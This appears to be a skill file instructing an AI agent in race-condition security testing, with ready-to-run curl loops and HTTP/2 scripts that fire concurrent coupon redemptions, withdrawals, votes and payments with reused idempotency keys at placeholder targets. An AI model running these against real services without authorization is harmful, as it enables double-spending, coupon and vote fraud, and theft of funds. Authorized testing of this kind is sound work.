---
name: vuln-race-conditions
description: "Race condition testing skill for concurrent request vulnerabilities. Tests TOCTOU, double-spend, coupon abuse, quota bypass using HTTP/2 tight synchronization. Triggers: 'race condition', 'race window', 'toctou', 'concurrent requests', 'double spend', 'coupon race', 'parallel requests', 'limit bypass'."
---

# Race Condition Testing

Test state transitions that should be atomic but aren't. Model invariants first — conservation rules, uniqueness constraints — then attack them.

## Phase 1: Surface Mapping

High-value attack surfaces:
- **Payments**: auth/capture/refund cycles; credit and loyalty point issuance
- **Coupons**: single-use code consumption; stacking validation; per-user limits
- **Quotas**: API rate limits; inventory reserves; seat allocation; voting restrictions
- **Auth**: password reset token consumption; OTP validation; session creation
- **Storage**: multi-part upload finalization; version writes; share link generation

```bash
# Identify idempotency-sensitive endpoints
grep -r "coupon\|redeem\|claim\|vote\|transfer\|withdraw\|refund" endpoints.txt
```

## Phase 2: Baseline Behavior

```bash
# Single request — establish expected state
curl -X POST https://<target>/api/coupon/redeem \
  -H "Authorization: Bearer <token>" \
  -d '{"code":"PROMO10"}'
# Expected: 200 OK + credit applied OR 400 already redeemed

# Verify database state
curl https://<target>/api/account/balance -H "Authorization: Bearer <token>"
```

## Phase 3: Concurrent Attack — HTTP/2 Tight Synchronization

HTTP/2 multiplexing sends multiple requests on one warmed connection for sub-millisecond timing:

```bash
# Prerequisites
pip install httpx[http2] --break-system-packages

# HTTP/2 race (tight sync)
python3 tools/race_http2.py \
  --url https://<target>/api/coupon/redeem \
  --token "Bearer <token>" \
  --count 20 \
  --body '{"code":"PROMO10"}'
```

**Multi-user/multi-session variant:**
```bash
python3 tools/race_multiuser.py \
  --url https://<target>/api/vote \
  --tokens tokens.txt \
  --count 10 \
  --body '{"candidate_id":42}'
```

**Simple shell parallel (last-byte sync):**
```bash
for i in $(seq 1 20); do
  curl -s -X POST https://<target>/api/coupon/redeem \
    -H "Authorization: Bearer <token>" \
    -d '{"code":"PROMO10"}' &
done; wait
```

## Phase 4: Common Vulnerability Patterns

**Read-modify-write without atomicity** (increments fail under load):
```bash
# Concurrent balance checks + withdrawals
python3 tools/race_http2.py --url https://<target>/api/withdraw \
  --count 10 --body '{"amount":100}' --token "Bearer <token>"
# Expected safe: 9x 402 Insufficient Funds
# Vulnerable: multiple 200 OK with same balance showing
```

**Idempotency scope bypass** (reusing keys across principals):
```bash
# Test same idempotency key for different users
curl -X POST https://<target>/api/payment \
  -H "Idempotency-Key: fixed-key-12345" \
  -H "Authorization: Bearer <user_a>" \
  -d '{"amount":50}'
curl -X POST https://<target>/api/payment \
  -H "Idempotency-Key: fixed-key-12345" \
  -H "Authorization: Bearer <user_b>" \
  -d '{"amount":50}'
```

**Optimistic concurrency evasion** (ETag/version not enforced):
```bash
# Get ETag
ETag=$(curl -I https://<target>/api/resource/123 | grep ETag | cut -d' ' -f2)
# Concurrent updates without If-Match
for i in $(seq 1 5); do
  curl -X PATCH https://<target>/api/resource/123 \
    -d '{"status":"claimed"}' &
done; wait
```

## Phase 5: Confirmation

```bash
# Verify durable state change
curl https://<target>/api/account/transactions -H "Authorization: Bearer <token>"
# Check: how many credits applied? Should be 1, race = N
curl https://<target>/api/audit/log -H "Authorization: Bearer <admin_token>"
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: single sequential request rejected/limited; N concurrent succeed where only 1 should
2. **Reproducibility**: consistent across multiple test runs with controlled synchronization
3. **Impact**: durable state change shown (ledger entries, role modifications, credit balance)

Must demonstrate across multiple channels (REST + GraphQL) where applicable.
